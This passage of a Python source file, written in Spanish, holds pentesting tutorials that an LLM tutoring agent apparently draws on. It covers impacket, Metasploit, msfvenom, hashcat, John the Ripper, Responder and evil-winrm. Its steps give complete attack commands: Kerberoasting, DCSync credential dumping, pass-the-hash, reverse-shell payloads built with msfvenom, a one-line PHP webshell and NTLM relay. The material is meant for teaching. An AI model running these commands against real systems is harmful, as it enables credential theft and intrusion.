                "explicacion": "psexec crea un servicio temporal en el objetivo y ejecuta comandos a través de SMB. Requiere admin.",
                "comando": "impacket-psexec <DOMINIO>/<USER>:'<PASS>'@<IP>\n# Con hash:\nimpacket-psexec -hashes :<NTLM> <DOMINIO>/Administrator@<IP>",
                "que_observar": "Shell como nt authority\\system directamente.",
                "pregunta_reflexion": "¿Por qué psexec da SYSTEM en lugar del usuario que autenticaste?",
            },
            {
                "paso": 2,
                "titulo": "Kerberoasting — obtener tickets de service accounts",
                "explicacion": "Cualquier usuario de dominio puede solicitar tickets TGS de cuentas con SPN. Los tickets son crackeables offline.",
                "comando": "impacket-GetUserSPNs <DOMINIO>/<USER>:'<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt",
                "que_observar": "Hashes en formato $krb5tgs$23$... — modo hashcat 13100.",
                "pregunta_reflexion": "Un TGS de una service account crackeado da credenciales de esa cuenta — ¿qué permisos suele tener una service account?",
            },
            {
                "paso": 3,
                "titulo": "AS-REP Roasting — sin credenciales previas",
                "explicacion": "Usuarios con pre-autenticación Kerberos deshabilitada envían su AS-REP sin verificar quién lo pide.",
                "comando": "# Sin credenciales (necesitas lista de usuarios):\nimpacket-GetNPUsers <DOMINIO>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat\n# Con credenciales:\nimpacket-GetNPUsers <DOMINIO>/<USER>:'<PASS>' -dc-ip <DC_IP> -request -format hashcat\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
                "que_observar": "Hashes en formato $krb5asrep$23$... — modo hashcat 18200.",
                "pregunta_reflexion": "¿Qué diferencia conceptual hay entre Kerberoasting y AS-REP Roasting?",
            },
            {
                "paso": 4,
                "titulo": "DCSync — volcar todos los hashes del dominio",
                "explicacion": "Con permisos de replicación (DA o mediante ACL abuse), extraer todos los hashes como si fuera un DC replicando.",
                "comando": "impacket-secretsdump <DOMINIO>/<USER>:'<PASS>'@<DC_IP> -just-dc\n# Resultado: todos los hashes NTLM del dominio\n# El más importante: krbtgt",
                "que_observar": "Formato: DOMINIO\\usuario:RID:LM_HASH:NTLM_HASH:::. El NTLM_HASH (el último) es el que se usa.",
                "pregunta_reflexion": "¿Por qué impacket-secretsdump es preferible a ejecutar mimikatz en el DC?",
            },
        ],
        "errores_comunes": [
            "Confundir el formato de credenciales — es DOMINIO/user:pass@IP, no user@DOMINIO.",
            "No usar -just-dc en secretsdump — sin ese flag intenta extraer de todos los métodos y es más lento.",
            "Olvidar que el hash LM en secretsdump es casi siempre 'aad3b...' (vacío) — solo usar el NTLM.",
        ],
        "flags_esenciales": {
            "impacket-psexec": "Shell SYSTEM via SMB",
            "impacket-wmiexec": "Shell via WMI (menos ruidoso)",
            "impacket-smbexec": "Shell via SMB (no escribe a disco)",
            "impacket-secretsdump": "Volcar credenciales (SAM, LSASS, NTDS)",  # pragma: allowlist secret
            "impacket-GetUserSPNs": "Kerberoasting",
            "impacket-GetNPUsers": "AS-REP Roasting",
            "impacket-ntlmrelayx": "NTLM relay attacks",
            "-hashes :NTLM": "Pass-the-Hash en todas las herramientas",
        },
        "recursos": [
            "https://github.com/fortra/impacket",
            "https://www.hackingarticles.in/impacket-guide-smb-msrpc/",
        ],
        "siguiente_paso_natural": "Hash krbtgt obtenido → Golden Ticket con mimikatz. Hashes de users → PtH con psexec/crackmapexec. TGS crackeado → acceso con las credenciales obtenidas.",
    },
    # ────────────────────────────────────────────────────────────────────────
    # C2 / PAYLOADS
    # ────────────────────────────────────────────────────────────────────────
    "msfconsole": {
        "nombre": "Msfconsole — Metasploit Framework",
        "categoria": "Explotación / C2",
        "que_es": (
            "Metasploit es el framework de explotación más usado en pentesting. "
            "Incluye: exploits (código que explota vulnerabilidades), payloads "
            "(código que se ejecuta en el target), auxiliares (scanners, brute force), "
            "y post-explotación (escalada, pivoting, dump de credenciales). "
            "Se controla desde msfconsole."
        ),
        "por_que_importa": (
            "Metasploit encapsula exploits complejos en una interfaz simple. "
            "Para el estudiante es valioso para entender el flujo exploit→payload→post, "
            "no para usarlo como caja negra. Saber qué hace cada módulo "
            "es más importante que saber memorizarlo."
        ),
        "instalacion": "Preinstalado en Kali. En otros: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sh",
        "conceptos_clave": [
            "Módulos: exploit/, payload/, auxiliary/, post/, encoder/. Cada uno cumple una función.",
            "Meterpreter: payload avanzado de Metasploit. Corre en memoria, cifrado, muchas funciones post.",
            "Sessions: cuando un exploit tiene éxito se crea una sesión. Gestionar con sessions -l.",
            "RHOSTS/LHOST: siempre configurar antes de ejecutar. RHOSTS = target, LHOST = tu IP.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Buscar y seleccionar un módulo",
                "explicacion": "El flujo estándar: search → use → options → set → run.",
                "comando": "msfconsole\n\n# Buscar módulos:\nsearch eternalblue\nsearch type:exploit name:apache\nsearch cve:2021-41773\n\n# Usar el módulo:\nuse exploit/windows/smb/ms17_010_eternalblue\n# O por número del search:\nuse 0",
                "que_observar": "El prompt cambia a msf6 exploit(nombre_módulo) > — ya estás dentro del módulo.",
                "pregunta_reflexion": "search devuelve 5 módulos para EternalBlue — ¿cómo eliges cuál usar?",
            },
            {
                "paso": 2,
                "titulo": "Configurar y ejecutar el exploit",
                "explicacion": "Siempre ver las opciones requeridas antes de ejecutar.",
                "comando": "options            # ver todas las opciones y cuáles son Required\nset RHOSTS <IP>   # IP del target\nset LHOST <KALI>  # tu IP (para el payload de reverse)\nset PAYLOAD windows/x64/meterpreter/reverse_tcp  # opcional, el default suele funcionar\nrun               # o exploit",
                "que_observar": "Required: yes y Value vacío = fallará. Completar todos los campos requeridos.",
                "pregunta_reflexion": "¿Qué diferencia hay entre un staged payload (/) y un stageless payload (//)? ¿Cuándo usas cada uno?",
            },
            {
                "paso": 3,
                "titulo": "Trabajar con sesiones Meterpreter",
                "explicacion": "Con una sesión de Meterpreter tienes acceso completo al sistema comprometido.",
                "comando": "# Una vez dentro de Meterpreter:\nsysinfo              # info del sistema\ngetuid               # usuario actual\ngetsystem            # intentar escalar a SYSTEM\nhashdump             # dump del SAM (si eres admin)\nshell                # obtener cmd.exe\ndownload fichero     # descargar fichero\nupload fichero dest  # subir fichero\nrun post/multi/recon/local_exploit_suggester  # buscar privesc",
                "que_observar": "getsystem exitoso = SYSTEM. hashdump = hashes NTLM locales.",
                "pregunta_reflexion": "¿En qué se diferencia una sesión Meterpreter de una reverse shell de netcat?",
            },
            {
                "paso": 4,
                "titulo": "Módulos auxiliares — scanners y brute force",
                "explicacion": "No solo exploits — Metasploit incluye decenas de auxiliares útiles.",
                "comando": "use auxiliary/scanner/smb/smb_ms17_010   # check EternalBlue sin explotar\nuse auxiliary/scanner/http/dir_scanner   # similar a gobuster\nuse auxiliary/scanner/ssh/ssh_login      # brute force SSH\nset RHOSTS <IP>; set PASS_FILE /ruta/rockyou.txt; run",
                "que_observar": "Los auxiliares son buenos para confirmar vulnerabilidades antes de explotar.",
                "pregunta_reflexion": "¿Por qué usar un auxiliary/scanner antes del exploit correspondiente?",
            },
        ],
        "errores_comunes": [
            "No comprobar options antes de run — falla por LHOST o RHOSTS vacíos.",
            "Usar Metasploit como caja negra sin entender qué hace el exploit — no se aprende nada.",
            "No hacer background de la sesión (Ctrl+Z) cuando se quiere seguir trabajando en msfconsole.",
            "Olvidar que AV detecta Meterpreter — en entornos modernos necesita evasión.",
        ],
        "flags_esenciales": {
            "search": "Buscar módulos",
            "use": "Seleccionar módulo",
            "options / info": "Ver opciones y descripción",
            "set OPCION valor": "Configurar opción",
            "run / exploit": "Ejecutar",
            "sessions -l": "Listar sesiones activas",
            "sessions -i N": "Interactuar con sesión N",
            "background / Ctrl+Z": "Dejar sesión en background",
        },
        "recursos": [
            "https://www.metasploit.com/",
            "https://docs.metasploit.com/",
            "https://book.hacktricks.xyz/pentesting/metasploit",
        ],
        "siguiente_paso_natural": "Shell obtenida → post/multi/recon/local_exploit_suggester para privesc. Meterpreter en Windows → hashdump → PtH. Sesión establecida → pivoting con route add.",
    },
    "msfvenom": {
        "nombre": "Msfvenom — Generador de payloads",
        "categoria": "Explotación / Payloads",
        "que_es": (
            "Msfvenom genera payloads standalone (ejecutables, scripts, shellcode) "
            "que establecen reverse shells o bind shells. Combina msfpayload y "
            "msfencode. Los payloads pueden ser para Windows, Linux, macOS, Android, "
            "PHP, Python, PowerShell y más."
        ),
        "por_que_importa": (
            "Cuando no puedes usar Metasploit directamente (el objetivo solo acepta "
            "un fichero ejecutable, una webshell PHP, un macro de Office), msfvenom "
            "genera el payload. Es la herramienta para crear el arma específica para cada vector."
        ),
        "instalacion": "Incluido en Metasploit. Disponible como msfvenom en Kali.",
        "conceptos_clave": [
            "Payload format: el formato del fichero de salida (exe, elf, raw, php, py, aspx...).",
            "Staged vs stageless: staged (/) requiere conexión de vuelta a MSF para descargarse. Stageless (//) es autocontenido.",
            "LHOST/LPORT: dirección y puerto donde el payload conectará (tu Kali).",
            "Encoder: -e para ofuscar el payload y evadir AV (limitado — AV moderno los detecta igual).",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Reverse shell Windows (.exe)",
                "explicacion": "El payload más básico para Windows. Genera un .exe que al ejecutarse conecta de vuelta.",
                "comando": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o shell.exe\n\n# Listener en Kali:\nnc -lvnp 4444\n\n# O con Meterpreter (más funcionalidades):\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o meter.exe",
                "que_observar": "Al ejecutar el .exe en el target, el listener recibe la conexión.",
                "pregunta_reflexion": "¿Cuándo usarías shell_reverse_tcp vs meterpreter/reverse_tcp?",
            },
            {
                "paso": 2,
                "titulo": "Webshell PHP",
                "explicacion": "Para subir a servidores PHP vulnerables (file upload, LFI a upload).",
                "comando": "msfvenom -p php/reverse_php LHOST=<KALI_IP> LPORT=4444 -f raw -o shell.php\n\n# O la webshell simple (sin msfvenom):\necho '<?php system($_GET[\"cmd\"]); ?>' > cmd.php",
                "que_observar": "Subir el fichero y acceder vía browser o curl: curl http://IP/shell.php?cmd=id",
                "pregunta_reflexion": "¿Por qué la webshell simple <?php system($_GET['cmd']); ?> suele preferirse sobre el payload de msfvenom?",
            },
            {
                "paso": 3,
                "titulo": "Reverse shell Linux (.elf)",
                "explicacion": "Para targets Linux cuando necesitas un binario ejecutable.",
                "comando": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f elf -o shell.elf\nchmod +x shell.elf  # en el target\n./shell.elf         # ejecutar",
                "que_observar": "Confirmar que la arquitectura del payload (x64/x86) coincide con el target.",
                "pregunta_reflexion": "¿Cómo verificas si el target es x86 o x64 antes de generar el payload?",
            },
            {
                "paso": 4,
                "titulo": "Listar payloads disponibles",
                "explicacion": "msfvenom tiene cientos de payloads para distintas plataformas y formatos.",
                "comando": "msfvenom -l payloads | grep windows    # payloads Windows\nmsfvenom -l payloads | grep linux      # payloads Linux\nmsfvenom -l formats                    # formatos de salida disponibles\nmsfvenom -p <PAYLOAD> --list-options   # opciones del payload",
                "que_observar": "Para cada plataforma hay payloads staged (/) y stageless (//). Los stageless son más grandes pero no necesitan MSF como handler.",
                "pregunta_reflexion": "¿Qué usarías para generar un payload para un target Android?",
            },
        ],
        "errores_comunes": [
            "Payload x64 en target x86 o viceversa — el ejecutable no corre.",
            "LHOST vacío o incorrecto — el target conecta a una IP que no es Kali.",
            "No poner el listener antes de ejecutar el payload en el target.",
            "Usar staged payload con nc como listener — staged necesita msf multi/handler.",
        ],
        "flags_esenciales": {
            "-p": "Payload a usar",
            "LHOST/LPORT": "IP y puerto del listener (tu Kali)",
            "-f": "Formato de salida (exe, elf, php, py, raw, aspx...)",
            "-o": "Fichero de salida",
            "-e": "Encoder",
            "-i": "Iteraciones del encoder",
            "-l payloads/formats": "Listar opciones disponibles",
        },
        "recursos": [
            "https://www.offensive-security.com/metasploit-unleashed/msfvenom/",
            "https://book.hacktricks.xyz/shells/msfvenom",
        ],
        "siguiente_paso_natural": "Payload generado → buscar el vector de entrega (file upload, LFI, service binary replacement). Listener listo antes de ejecutar. Shell recibida → stabilizar y escalar.",
    },
    # ────────────────────────────────────────────────────────────────────────
    # CRACKING
    # ────────────────────────────────────────────────────────────────────────
    "hashcat": {
        "nombre": "Hashcat — Password Cracking (GPU)",
        "categoria": "Password cracking",
        "que_es": (
            "Hashcat es el cracker de contraseñas más rápido del mundo. "
            "Usa la GPU para probar millones de candidatos por segundo. "
            "Soporta más de 300 tipos de hash y múltiples modos de ataque: "
            "diccionario, fuerza bruta, reglas, combinator, mask."
        ),
        "por_que_importa": (
            "Los hashes son el activo más recuperado en pentesting. "
            "Hashcat convierte hashes en contraseñas en texto claro. "
            "Una contraseña crackeada puede dar acceso a otros sistemas si se reutiliza."
        ),
        "instalacion": "Preinstalado en Kali. En otros: descargar de hashcat.net. Necesita drivers GPU.",
        "conceptos_clave": [
            "Modo (-m): el tipo de hash. Siempre identificar el hash primero con hashid o name-that-hash.",
            "Ataque (-a): 0=diccionario, 1=combinator, 3=brute force/mask, 6=diccionario+mask.",
            "Reglas (-r): transformaciones aplicadas a cada palabra del diccionario (mayúsculas, añadir números, etc.).",
            "Session y pot: hashcat guarda el progreso. Los hashes crackeados van al hashcat.potfile.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Identificar el tipo de hash",
                "explicacion": "Antes de crackear, identificar el algoritmo. Un modo incorrecto no crackeará nada.",
                "comando": "hashid '<HASH>'           # identificar tipo\nname-that-hash -t '<HASH>'  # alternativa más completa\n\n# Tipos más comunes en CTFs:\n# MD5: -m 0    (32 chars hex)\n# SHA1: -m 100  (40 chars hex)\n# SHA256: -m 1400  (64 chars hex)\n# bcrypt: -m 3200  (empieza con $2y$ o $2b$)\n# NTLM: -m 1000  (32 chars hex, entorno Windows)\n# sha512crypt: -m 1800  (empieza con $6$, /etc/shadow Linux)\n# NetNTLMv2: -m 5600  (de Responder)",
                "que_observar": "El prefijo del hash ($2y$, $6$, $krb5tgs$) suele indicar el tipo directamente.",
                "pregunta_reflexion": "Encuentras el hash $6$salt$hashvalor — ¿qué modo usarías en hashcat?",
            },
            {
                "paso": 2,
                "titulo": "Ataque de diccionario — el más eficiente",
                "explicacion": "Probar cada palabra de rockyou.txt contra el hash. La forma más rápida de crackear contraseñas débiles.",
                "comando": "hashcat -m <MODO> hash.txt /usr/share/wordlists/rockyou.txt\n\n# Ver el progreso:\nhashcat -m <MODO> hash.txt /usr/share/wordlists/rockyou.txt --status\n\n# Cuando termina, ver resultados:\nhashcat -m <MODO> hash.txt --show",
                "que_observar": "Status: Cracked al terminar. La contraseña aparece en el output o en hashcat.potfile.",
                "pregunta_reflexion": "El diccionario termina sin crackear — ¿cuál es tu siguiente opción antes de brute force?",
            },
            {
                "paso": 3,
                "titulo": "Reglas — multiplicar el diccionario",
                "explicacion": "Las reglas aplican transformaciones a cada palabra: capitalizar, añadir números, leetspeak. Muy efectivo para contraseñas de empresa.",
                "comando": "# best64: 64 reglas más efectivas estadísticamente\nhashcat -m <MODO> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# OneRuleToRuleThemAll: regla más efectiva conocida\nhashcat -m <MODO> hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule\n\n# Combinar múltiples reglas:\nhashcat -m <MODO> hash.txt rockyou.txt -r best64.rule -r toggles1.rule",
                "que_observar": "El número de candidatos se multiplica enormemente. Puede tardar más pero crackea contraseñas más complejas.",
                "pregunta_reflexion": "¿Qué transformación añade la regla best64 que rockyou.txt base no tiene?",
            },
            {
                "paso": 4,
                "titulo": "Mask attack — brute force estructurado",
                "explicacion": "Brute force con conocimiento de la estructura de la contraseña. Mucho más eficiente que brute force puro.",
                "comando": "# Patrones:\n?u = uppercase, ?l = lowercase, ?d = digit, ?s = special\n\n# Ejemplo: contraseña de 8 chars mayúscula+6 minúsculas+dígito\nhashcat -m <MODO> hash.txt -a 3 ?u?l?l?l?l?l?l?d\n\n# Patrón tipo empresa (Verano2024!):\nhashcat -m <MODO> hash.txt -a 3 ?u?l?l?l?l?d?d?d?d!",
                "que_observar": "El keyspace (número de candidatos) se muestra al inicio — indica cuánto tardará.",
                "pregunta_reflexion": "¿Cuándo usarías mask attack en lugar de diccionario con reglas?",
            },
        ],
        "errores_comunes": [
            "No identificar el tipo de hash antes de crackear — -m incorrecto = 0 resultados.",
            "Olvidar --show para ver los hashes ya crackeados en el potfile.",
            "No usar reglas — crackear rockyou.txt sin reglas es solo el 30% del potencial.",
            "Intentar crackear bcrypt ($2y$) igual que MD5 — bcrypt es intencionalmente lento.",
        ],
        "flags_esenciales": {
            "-m": "Modo (tipo de hash)",
            "-a": "Modo de ataque (0=diccionario, 3=brute force/mask)",
            "-r": "Fichero de reglas",
            "--show": "Mostrar hashes ya crackeados",
            "--session": "Nombre de sesión para continuar después",
            "--restore": "Continuar una sesión guardada",
            "-O": "Optimized kernels (más rápido para contraseñas cortas)",
        },
        "recursos": [
            "https://hashcat.net/wiki/doku.php?id=hashcat",
            "https://hashcat.net/wiki/doku.php?id=rule_based_attack",
            "https://crackstation.net — lookup online para hashes comunes",
        ],
        "siguiente_paso_natural": "Hash crackeado → probar en todos los servicios disponibles. Contraseñas comunes → password spray en AD. Si no crackea → intentar PtH con el hash directamente.",
    },
    "john": {
        "nombre": "John the Ripper — Password Cracker (CPU)",
        "categoria": "Password cracking",
        "que_es": (
            "John the Ripper es el cracker de contraseñas clásico, optimizado para CPU. "
            "Su ventaja sobre hashcat es el soporte automático de formatos complejos: "
            "ficheros ZIP, PDF, KeePass, SSH keys, /etc/shadow directamente. "
            "John convierte automáticamente estos formatos a hashes crackeables."
        ),
        "por_que_importa": (
            "Los scripts john2hash (ssh2john, zip2john, keepass2john, etc.) convierten "
            "ficheros protegidos a hashes que luego se crackean. Es el complemento de "
            "hashcat para vectores que no son hashes raw directamente."
        ),
        "instalacion": "Preinstalado en Kali. Asegúrate de tener john y los scripts *2john.",
        "conceptos_clave": [
            "john2hash scripts: ssh2john, zip2john, keepass2john, pdf2john, office2john... Están en /usr/share/john/",
            "john --wordlist: modo diccionario. john --incremental: brute force puro.",
            "john --show: ver contraseñas ya crackeadas.",
            "john.pot: fichero donde john guarda los resultados.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Crackear /etc/shadow (hashes Linux)",
                "explicacion": "Si tienes /etc/passwd y /etc/shadow, unshadow los combina y john los crackea.",
                "comando": "unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt\njohn unshadowed.txt --show  # ver resultados",
                "que_observar": "john detecta automáticamente el algoritmo (MD5, SHA512, bcrypt).",
                "pregunta_reflexion": "¿Por qué necesitas ambos ficheros (/etc/passwd y /etc/shadow) en lugar de solo /etc/shadow?",
            },
            {
                "paso": 2,
                "titulo": "Crackear claves SSH protegidas",
                "explicacion": "Si encuentras una clave SSH privada con passphrase, ssh2john extrae el hash para crackear.",
                "comando": "ssh2john id_rsa > id_rsa.hash\njohn id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt\njohn id_rsa.hash --show",
                "que_observar": "La passphrase crackeada se usa con: ssh -i id_rsa user@IP (pedirá la passphrase).",
                "pregunta_reflexion": "Encuentras una clave SSH en el servidor — ¿cómo sabes si tiene passphrase antes de intentar crackearla?",
            },
            {
                "paso": 3,
                "titulo": "Crackear ZIPs y otros ficheros protegidos",
                "explicacion": "Los ficheros ZIP, PDF, KeePass, Office protegidos con contraseña tienen hashes crackeables.",
                "comando": "# ZIP:\nzip2john protected.zip > zip.hash\njohn zip.hash --wordlist=/usr/share/wordlists/rockyou.txt\n\n# KeePass:\nkeepass2john database.kdbx > keepass.hash\njohn keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt\n\n# Ver todos los scripts disponibles:\nls /usr/share/john/*2john*",
                "que_observar": "Una vez crackeado, usar la contraseña para abrir el fichero original.",
                "pregunta_reflexion": "¿Qué es más probable que tenga valor en un fichero KeePass encontrado en el sistema?",
            },
        ],
        "errores_comunes": [
            "Intentar crackear directamente un fichero ZIP con john en lugar de usar zip2john primero.",
            "Olvidar --show para ver contraseñas ya crackeadas en sesiones anteriores.",
            "Usar john cuando hashcat con GPU sería 100x más rápido para hashes raw.",
        ],
        "flags_esenciales": {
            "--wordlist": "Diccionario a usar",
            "--show": "Mostrar contraseñas crackeadas",
            "--format": "Forzar formato si john no lo detecta bien",
            "--incremental": "Brute force puro",
            "--rules": "Aplicar reglas (similar a hashcat)",
        },
        "recursos": [
            "https://www.openwall.com/john/",
            "ls /usr/share/john/ — scripts de conversión disponibles",
        ],
        "siguiente_paso_natural": "Contraseña crackeada → acceder con las credenciales. KeePass abierto → buscar contraseñas de otros servicios. Clave SSH con passphrase crackeada → conectar al SSH del target.",
    },
    "responder": {
        "nombre": "Responder — Captura de hashes NTLM",
        "categoria": "Active Directory / MITM",
        "que_es": (
            "Responder es un servidor LLMNR/NBT-NS/mDNS poisoner. Cuando un equipo Windows "
            "no puede resolver un nombre via DNS, intenta LLMNR y NBT-NS. Responder "
            "responde a esas peticiones haciéndose pasar por el servidor buscado y "
            "captura los hashes NetNTLMv2 del intento de autenticación."
        ),
        "por_que_importa": (
            "En redes corporativas Windows, los hashes NetNTLMv2 se generan automáticamente "
            "cuando alguien escribe una ruta UNC incorrecta o hace click en un link de red. "
            "Responder los captura pasivamente. Los hashes capturados son crackeables "
            "offline o usables en NTLM relay sin crackearlos."
        ),
        "instalacion": "Preinstalado en Kali. git clone https://github.com/lgandx/Responder",
        "conceptos_clave": [
            "LLMNR: protocolo de resolución de nombres local. Windows lo usa cuando DNS falla.",
            "NetNTLMv2: el hash capturado por Responder. Crackeable con hashcat -m 5600.",
            "NTLM relay: en lugar de crackear, retransmitir el hash directamente a otro servicio (más efectivo).",
            "SMB signing: si está habilitado en el target, el relay no funciona.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Capturar hashes con Responder",
                "explicacion": "Iniciar Responder y esperar a que alguien en la red haga una petición mal resuelta.",
                "comando": "sudo responder -I eth0 -rdw\n\n# Cuando alguien intenta acceder a un recurso inexistente:\n# \\\\SERVIDOR_INEXISTENTE\\share → Responder captura el hash\n\n# Los hashes capturados se guardan en:\n/usr/share/responder/logs/",
                "que_observar": "Líneas '[SMB] NTLMv2-SSP Hash' en el output — contienen el hash capturado.",
                "pregunta_reflexion": "¿Por qué el hash que captura Responder es NetNTLMv2 y no NTLM?",
            },
            {
                "paso": 2,
                "titulo": "Crackear los hashes capturados",
                "explicacion": "NetNTLMv2 es hashcat modo 5600.",
                "comando": "# El hash está en el log de Responder, formato:\n# usuario::DOMINIO:challenge:hash_response\nhashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt",
                "que_observar": "Si la contraseña está en rockyou.txt, se crackeará. Contraseñas complejas → muy difícil.",
                "pregunta_reflexion": "¿Qué harías si el hash no crackea con rockyou.txt?",
            },
            {
                "paso": 3,
                "titulo": "NTLM Relay — usar sin crackear",
                "explicacion": "Con ntlmrelayx, retransmitir el hash capturado directamente a otro host que tenga SMB signing deshabilitado.",
                "comando": "# Paso 1: deshabilitar SMB y HTTP en Responder (para que ntlmrelayx las maneje):\n# Editar /usr/share/responder/Responder.conf → SMB = Off, HTTP = Off\n\n# Paso 2: generar lista de targets sin signing:\ncrackmapexec smb <subred>/24 --gen-relay-list targets.txt\n\n# Paso 3: iniciar ntlmrelayx:\nimpacket-ntlmrelayx -tf targets.txt -smb2support\n\n# Paso 4: iniciar Responder:\nsudo responder -I eth0 -rdw",
                "que_observar": "ntlmrelayx retransmite el hash y si tiene éxito, vuelca el SAM del target automáticamente.",
                "pregunta_reflexion": "¿Por qué necesitas deshabilitar SMB y HTTP en Responder cuando usas ntlmrelayx?",
            },
        ],
        "errores_comunes": [
            "Activar Responder en una red de producción sin autorización — genera eventos de seguridad inmediatos.",
            "No deshabilitar SMB/HTTP en Responder cuando se usa con ntlmrelayx — conflicto de puertos.",
            "Intentar relay a hosts con SMB signing habilitado — no funciona.",
        ],
        "flags_esenciales": {
            "-I": "Interfaz de red",
            "-rdw": "Activar LLMNR, NBT-NS y WPAD poisoning",
            "-A": "Modo análisis (no envenena, solo observa)",
        },
        "recursos": [
            "https://github.com/lgandx/Responder",
            "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/llmnr-nbt-ns-poisoning-and-relay",
        ],
        "siguiente_paso_natural": "Hash capturado → hashcat -m 5600 para crackear. Si SMB signing deshabilitado → ntlmrelayx para obtener SAM directamente. Credenciales obtenidas → crackmapexec/evil-winrm.",
    },
    "evil-winrm": {
        "nombre": "Evil-WinRM — Shell remota Windows vía WinRM",
        "categoria": "Post-explotación Windows / Movimiento lateral",
        "que_es": (
            "Evil-WinRM es un cliente de WinRM (Windows Remote Management) para pentesting. "
            "Ofrece una shell interactiva en sistemas Windows donde WinRM está habilitado "
            "(puerto 5985/5986). Soporta PtH, upload/download de ficheros, carga de "
            "scripts PowerShell y módulos."
        ),
        "por_que_importa": (
            "WinRM está habilitado por defecto en Windows Server. Es el método más limpio "
            "para obtener una shell en Windows cuando tienes credenciales válidas: "
            "no crea servicios (como psexec), no necesita SMB, y soporta PowerShell completo."
        ),
        "instalacion": "Preinstalado en Kali. gem install evil-winrm",
        "conceptos_clave": [
            "WinRM: protocolo de gestión remota de Windows. Puerto 5985 (HTTP) y 5986 (HTTPS).",
            "Requiere que el usuario sea miembro de Remote Management Users o Administrators.",
            "Soporta Pass-the-Hash con -H.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Conectar con contraseña",
                "explicacion": "Si tienes credenciales válidas y WinRM está abierto (puerto 5985).",
                "comando": "evil-winrm -i <IP> -u <USER> -p '<PASS>'\n\n# Una vez dentro, comandos PowerShell normales:\nwhoami\nnet user\nnet localgroup administrators",
                "que_observar": "Prompt como Evil-WinRM shell v3.x — ya tienes shell PowerShell interactiva.",
                "pregunta_reflexion": "¿Qué ventaja tiene evil-winrm sobre impacket-psexec para pentesting en entornos reales?",
            },
            {
                "paso": 2,
                "titulo": "Pass-the-Hash y subir ficheros",
                "explicacion": "evil-winrm soporta PtH directamente y permite subir herramientas al target.",
                "comando": "# PtH:\nevil-winrm -i <IP> -u Administrator -H <NTLM_HASH>\n\n# Subir fichero al target:\nupload /ruta/local/winPEAS.exe C:\\Windows\\Temp\\wp.exe\n\n# Descargar fichero del target:\ndownload C:\\Users\\admin\\Desktop\\flag.txt /tmp/flag.txt",
                "que_observar": "Confirmar que el upload fue exitoso antes de intentar ejecutar.",
                "pregunta_reflexion": "¿Por qué subir winPEAS a C:\\Windows\\Temp en lugar del escritorio del usuario?",
            },
        ],
        "errores_comunes": [
            "Intentar conectar sin verificar que el puerto 5985 está abierto (nmap primero).",
            "Usar un usuario que no está en Remote Management Users ni en Administrators.",
            "Olvidar las comillas en contraseñas con caracteres especiales.",
        ],
        "flags_esenciales": {
            "-i": "IP del objetivo",
            "-u": "Usuario",
            "-p": "Contraseña",
            "-H": "Hash NTLM (Pass-the-Hash)",
            "-S": "Usar SSL (puerto 5986)",
            "-s": "Ruta a scripts PowerShell a cargar automáticamente",
        },
        "recursos": [
            "https://github.com/Hackplayers/evil-winrm",
        ],
        "siguiente_paso_natural": "Shell obtenida → subir winPEAS → ejecutar → analizar. Si eres admin → hashdump o secretsdump. Si no → buscar privesc con los vectores encontrados.",
    },
}


# ============================================================================
# FUNCIÓN PÚBLICA — llamada por el agente
# ============================================================================


def generate_tool_tutorial(tool: str, level: str = "intermedio") -> dict:
    """Genera un tutorial estructurado de una herramienta de pentesting.

    Combina contenido técnico base verificado (estático) con metadatos
    pedagógicos que el LLM usa para adaptar el nivel y el contexto de
    la explicación. El agente usa este dict como base y lo enriquece
    conversacionalmente.

    Args:
        tool: Nombre de la herramienta. Ejemplos:
            'nmap', 'gobuster', 'ffuf', 'burpsuite', 'sqlmap',
            'linpeas', 'pspy', 'winpeas', 'mimikatz', 'bloodhound',
            'crackmapexec', 'impacket', 'msfconsole', 'msfvenom',
            'hashcat', 'john', 'responder', 'evil-winrm',
            'whatweb', 'nikto', 'enum4linux'
        level: Nivel del estudiante para adaptar el enfoque.
            'principiante' | 'intermedio' | 'avanzado'

    Returns:
        dict con:
            - status: 'success' | 'not_found'
            - tool_name, category, level
            - what_it_is: qué hace la herramienta
            - why_it_matters: por qué importa en pentesting
            - key_concepts: conceptos previos necesarios
            - learning_path: pasos ordenados de aprendizaje (con comandos,
                qué observar y preguntas de reflexión)
            - common_mistakes: errores típicos a evitar
            - essential_flags: flags clave con explicación
            - resources: referencias para profundizar
            - next_natural_step: qué herramienta/fase sigue naturalmente
            - pedagogy_hints: indicaciones para el LLM sobre cómo presentar
                el contenido según el nivel
    """
    if not tool:
        return {
            "status": "error",
            "message": "Especifica el nombre de la herramienta.",
            "available": sorted(_TUTORIALS.keys()),
        }

    key = tool.lower().strip().replace(" ", "-").replace("_", "-")
    # Búsqueda tolerante: coincidencia exacta primero, luego parcial
    matched = (
        key
        if key in _TUTORIALS
        else next((k for k in _TUTORIALS if key in k or k in key), None)
    )

    if not matched:
        return {
            "status": "not_found",
            "message": (
                f"'{tool}' no tiene tutorial integrado. "
                "Puedo explicarla conversacionalmente — dime qué quieres saber."
            ),
